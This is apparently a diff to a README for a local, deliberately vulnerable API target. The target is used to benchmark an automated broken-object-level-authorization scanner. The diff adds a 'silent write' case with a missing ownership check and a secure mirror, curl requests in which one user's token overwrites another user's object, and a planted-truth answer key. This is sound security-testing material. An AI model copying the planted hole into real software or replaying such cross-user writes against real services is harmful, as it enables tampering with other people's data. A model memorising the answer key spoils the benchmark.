@@ -70,6 +70,16 @@ field — the only read-back is the cross-path `GET /api/audit-log`:
 | bob   | `bob_dn`               | `bob_nick`          |
 | carol | `carol_dn`             | `carol_nick`        |
 
+Each user also owns one **gizmo** and one **sprocket** (the M1.2 X-SILENT cases). Both are
+written via `POST /api/users/{id}/gizmo|sprocket` with **no GET on that path**; their state is
+read cross-path at `GET /api/gizmos/{id}` / `GET /api/sprockets/{id}` (id == owner id):
+
+| user  | gizmo `code`      | sprocket `code`      |
+|-------|-------------------|----------------------|
+| alice | `gizmo_alice_v0`  | `sprocket_alice_v0`  |
+| bob   | `gizmo_bob_v0`    | `sprocket_bob_v0`    |
+| carol | `gizmo_carol_v0`  | `sprocket_carol_v0`  |
+
 The token maps 1:1 to a user, and the user carries a `role`, so the token
 transitively **encodes which user (and thus their role)** — no crypto, this is a
 target. Log in to retrieve a token (static, so this is mostly a formality):
@@ -456,6 +466,59 @@ The status is `200` and the body is the same length as a real ledger, but `owner
 
 ---
 
+## M1.2 silent-write / object-STATE additions (X-SILENT cases)
+
+Both are **silent writes with NO same-path GET** and **no audit row** — unlike X-CROSS/X-SAFE,
+they are deliberately **not** recorded in `GET /api/audit-log`. The only observation point is the
+object's **own state on a DIFFERENT path** (`GET /api/gizmos/{id}` / `GET /api/sprockets/{id}`).
+That is what forces the engine to resolve and gather the object's state endpoint itself (M1.2(B)) —
+the model does not find it unaided. The write responses are **byte-identical** between the REAL and
+the SECURE case, so only the state read separates them.
+
+### X-SILENT-VULN — REAL silent cross-path write (gizmo)
+
+`POST /api/users/{user_id}/gizmo` has **no ownership check** (REAL) and returns the same opaque
+`200 {"status":"ok"}` as the secure mirror. There is **no GET on that path** (a GET returns **405**).
+
+```bash
+# Bob's gizmo state BEFORE (Alice may read it — this is the observation channel)
+curl -s http://127.0.0.1:8001/api/gizmos/2 -H 'Authorization: Bearer alice-token-aaaa'
+# -> {"id":2,"owner_id":2,"code":"gizmo_bob_v0"}
+
+# Alice writes a UNIQUE value into BOB'S gizmo with HER token
+curl -s -X POST http://127.0.0.1:8001/api/users/2/gizmo \
+  -H 'Authorization: Bearer alice-token-aaaa' -H 'Content-Type: application/json' \
+  -d '{"code":"gz-unique-7c3f9a12e4b"}'
+# -> {"status":"ok"}      (opaque — gives nothing away)
+
+# The ONLY proof: the victim's own state on a DIFFERENT path now carries Alice's value
+curl -s http://127.0.0.1:8001/api/gizmos/2 -H 'Authorization: Bearer alice-token-aaaa'
+# -> {"id":2,"owner_id":2,"code":"gz-unique-7c3f9a12e4b"}     <- the write LANDED
+```
+
+### X-SILENT-SAFE — SECURE mirror (sprocket)
+
+`POST /api/users/{user_id}/sprocket` **enforces ownership**: a cross-user write is **silently
+dropped** (no change, still `200 {"status":"ok"}`, never a 403). Planted: **NOT vulnerable**.
+
+```bash
+# Alice attempts the same write against BOB'S sprocket — identical opaque response
+curl -s -X POST http://127.0.0.1:8001/api/users/2/sprocket \
+  -H 'Authorization: Bearer alice-token-aaaa' -H 'Content-Type: application/json' \
+  -d '{"code":"gz-unique-7c3f9a12e4b"}'
+# -> {"status":"ok"}      (byte-identical to X-SILENT-VULN — a single-shot oracle cannot tell)
+
+# The state read shows the value was NEVER written — the unique value is ABSENT
+curl -s http://127.0.0.1:8001/api/sprockets/2 -H 'Authorization: Bearer alice-token-aaaa'
+# -> {"id":2,"owner_id":2,"code":"sprocket_bob_v0"}           <- UNCHANGED
+```
+
+That **absence of the unique value** is exactly what the verifier's payload-causality gate keys on:
+owner-identity and caller!=owner confirm for BOTH cases, so only causality separates them. A
+`verified` on X-SILENT-SAFE is a **false positive**.
+
+---
+
 ## Planted-truth summary (ground truth / answer key)
 
 | case   | endpoint                              | planted truth          | how to confirm                                  |
@@ -473,6 +536,8 @@ The status is `200` and the body is the same length as a real ledger, but `owner
 | X-SAFE | `POST /api/users/{id}/nickname`     | **NOT vulnerable** (cross-path secured trap) | cross-path: `GET /api/audit-log` shows NO row for the dropped cross-user write |
 | X-EQUIV-VULN | `GET /api/statements/{id}`    | **REAL** (read-type semantic-equivalence BOLA) | equal-length read: attack body carries `owner_id:2` (semantics, not size) |
 | X-EQUIV-SAFE | `GET /api/ledgers/{id}`       | **NOT vulnerable** (read-type secured control) | equal-length soft-200 denial: `owner_id:0`, `status:"DENY"`, zero-UUID — no victim data |
+| X-SILENT-VULN | `POST /api/users/{id}/gizmo`   | **REAL** (silent write, object-STATE confirmable) | cross-path STATE: `GET /api/gizmos/{id}` carries the unique written value (no same-path GET, no audit row) |
+| X-SILENT-SAFE | `POST /api/users/{id}/sprocket`| **NOT vulnerable** (silent-write secured mirror) | cross-path STATE: `GET /api/sprockets/{id}` still holds the ORIGINAL value — the unique value is ABSENT |
 
 ---
 
@@ -488,7 +553,7 @@ rm vulnerable_target/vulnerable_target.db   # next start re-seeds Alice, Bob & C
 pytest vulnerable_target/test_vulns.py -v
 ```
 
-The suite (`test_vulns.py`, **14 tests**) automates the login + sanity checks and
+The suite (`test_vulns.py`, **19 tests**) automates the login + sanity checks and
 the **five core cases only — A, B, C, D, and the SAFE control**:
 - **Vuln A** — Alice's token reads Bob's order (single-shot diff).
 - **Vuln B** — Alice overwrites Bob's name; follow-up GET confirms the change;
